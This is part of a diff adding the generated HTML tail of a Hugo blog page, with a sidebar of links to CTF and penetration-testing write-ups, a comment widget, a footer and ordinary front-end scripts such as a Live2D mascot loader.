+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/vulnhub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/">
+        
+        
+            <div class="article-image">
+                <img src="/p/vulnhub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/1.b108e4e2fee91c5001428d9681d2a674.webp" 
+                        width="1200" 
+                        height="2640" 
+                        loading="lazy"
+                        alt="Featured image of post vulnhub靶机渗透"
+                        
+                        data-hash="md5-sQjk4v7pHFABQo2WgdKmdA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">vulnhub靶机渗透</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/thm%E6%97%A5%E8%AE%B0/">
+        
+        
+            <div class="article-image">
+                <img src="/p/thm%E6%97%A5%E8%AE%B0/1.9349c37f2956be9c3933760456845267.webp" 
+                        width="2048" 
+                        height="1536" 
+                        loading="lazy"
+                        alt="Featured image of post thm日记"
+                        
+                        data-hash="md5-k0nDfylWvpw5M3YEVoRSZw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">thm日记</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/">
+        
+        
+            <div class="article-image">
+                <img src="/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/1.36b7be2aa84abef312bd7b8ca3fd18f0.png" 
+                        width="1216" 
+                        height="832" 
+                        loading="lazy"
+                        alt="Featured image of post 玄机打靶日记"
+                        
+                        data-hash="md5-Nre&#43;KqhKvvMSvXuMo/0Y8A==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">玄机打靶日记</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/7.25bugkuawd/">
+        
+        
+            <div class="article-image">
+                <img src="/p/7.25bugkuawd/1.60a21731600a7888cc7d837a06489951.png" 
+                        width="720" 
+                        height="1440" 
+                        loading="lazy"
+                        alt="Featured image of post 7.25bugkuawd"
+                        
+                        data-hash="md5-YKIXMWAKeIjMfYN6BkiZUQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">7.25bugkuawd</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/7.18bugkuawd/">
+        
+        
+            <div class="article-image">
+                <img src="/p/7.18bugkuawd/1.1cf7afb7adf3831906f425729565740a.jpg" 
+                        width="768" 
+                        height="1152" 
+                        loading="lazy"
+                        alt="Featured image of post 7.18bugkuawd"
+                        
+                        data-hash="md5-HPevt63zgxkG9CVylWV0Cg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">7.18bugkuawd</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script src='//unpkg.com/@waline/client@v2/dist/waline.js'></script>
+<link href='//unpkg.com/@waline/client@v2/dist/waline.css' rel='stylesheet'/>
+<div id="waline" class="waline-container"></div>
+<style>
+    .waline-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+        --waline-font-size: var(--article-font-size);
+    }
+    .waline-container .wl-count {
+        color: var(--card-text-color-main);
+    }
+</style><script>
+    
+    Waline.init({"dark":"html[data-scheme=\"dark\"]","el":"#waline","emoji":["https://unpkg.com/@waline/emojis@1.0.1/weibo"],"locale":{"admin":"Admin","placeholder":null},"requiredMeta":["name","email","url"],"serverURL":"https://waline-test-one-smoky.vercel.app"});
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 无敌可爱美咕噜
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+<style>
+  body {
+    background: url(https://0d000721999.github.io/background/1.webp) no-repeat center top;
+    background-size: cover;
+    background-attachment: fixed;
+  }
+</style>
+
+ 
+<style>
+  @font-face {
+    font-family: 'ss';
+    src: url(https://0d000721999.github.io/font/SeriousShannsNerdFontMono-Regular.otf) format('opentype');
+  }
+
+  :root {
+    --base-font-family: 'ss';
+    --code-font-family: 'ss';
+  }
+</style>
+<style>
+    #TableOfContents > ul, ol {
+        ul, ol {
+            display: none;
+        }
+        .open {
+            display: block;
+        }
+    }
+</style>
+
+<script>
+    function initTocHide() {
+        
+        let toc = document.querySelector(".widget--toc");
+        if (!toc) {
+            return;
+        }
+        
+        window.addEventListener('scroll', function() {
+            
+            let openUl = document.querySelectorAll(".open");
+            if (openUl.length > 0) {
+              openUl.forEach((ul) => {
+                ul.classList.remove("open")
+              })
+            }
+            
+            let currentLi = document.querySelector(".active-class");
+            if (!currentLi) {
+                return
+            }
+            
+            if (currentLi.children.length > 1) {
+                currentLi.children[1].classList.add("open")
+            }
+            
+            let ul = currentLi.parentElement;
+            do {
+                ul.classList.add("open");
+                ul = ul.parentElement.parentElement
+            } while (ul !== undefined && (ul.localName === 'ul' || ul.localName === 'ol'))
+        });
+    }
+    initTocHide()
+</script>
+
+<style>
+    #backTopBtn {
+        display: none;
+        position: fixed;
+        bottom: 30px;
+        z-index: 99;
+        cursor: pointer;
+        width: 30px;
+        height: 30px;
+        background-image: url(https://0d000721999.github.io/icons/backTop.svg);
+    }
+</style>
+
+<script>
+    
+
+    function initScrollTop() {
+        let rightSideBar = document.querySelector(".right-sidebar");
+        if (!rightSideBar) {
+            return;
+        }
+        
+        let btn = document.createElement("div");
+        btn.id = "backTopBtn";
+        btn.onclick = backToTop
+        rightSideBar.appendChild(btn)
+        
+        window.onscroll = function() {
+            
+            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+                btn.style.display = "block";
+            } else {
+                btn.style.display = "none";
+            }
+        };
+    }
+
+    
+
+    function backToTop(){
+        window.scrollTo({ top: 0, behavior: "smooth" })
+    }
+
+    initScrollTop();
+</script>
+
+
+<script>   
+  const cdnPath = "https://cdn.jsdelivr.net/gh/0d000721999/live2d-test@f09405fd";
+  const cssPath = "https://0d000721999.github.io/waifu/waifu.css"
+  const config = {
+    
+    path: {
+      homePath: "/",
+      modelPath: cdnPath + "/Resources/",
+      cssPath: cssPath,
+      tipsJsonPath: cdnPath + "/waifu-tips.json",
+      tipsJsPath: cdnPath + "/waifu-tips.js",
+      live2dCorePath: cdnPath + "/Core/live2dcubismcore.js",
+      live2dSdkPath: cdnPath + "/live2d-sdk.js"
+    },
+    
+    tools: ["hitokoto", "asteroids", "express","photo", "quit"],
+    
+    drag: {
+      enable: true,
+      direction: ["x", "y"]
+    },
+    
+    switchType: "order"
+  }
+
+  
+  if (screen.width >= 768) {
+    Promise.all([
+      loadExternalResource(config.path.cssPath, "css"),
+      loadExternalResource(config.path.live2dCorePath, "js"),
+      loadExternalResource(config.path.live2dSdkPath, "js"),
+      loadExternalResource(config.path.tipsJsPath, "js")
+    ]).then(() => {
+      initWidget({
+        waifuPath: config.path.tipsJsonPath,
+        cdnPath: config.path.modelPath,
+        tools: config.tools,
+        dragEnable: config.drag.enable,
+        dragDirection: config.drag.direction,
+        switchType: config.switchType
+      });
+    });
+  }
+
+  
+  function loadExternalResource(url, type) {
+    return new Promise((resolve, reject) => {
+      let tag;
+      if (type === "css") {
+        tag = document.createElement("link");
+        tag.rel = "stylesheet";
+        tag.href = url;
+      }
+      else if (type === "js") {
+        tag = document.createElement("script");
+        tag.src = url;
+      }
+      if (tag) {
+        tag.onload = () => resolve(url);
+        tag.onerror = () => reject(url);
+        document.head.appendChild(tag);
+      }
+    });
+  }
+</script>
+
+    </body>
+</html>
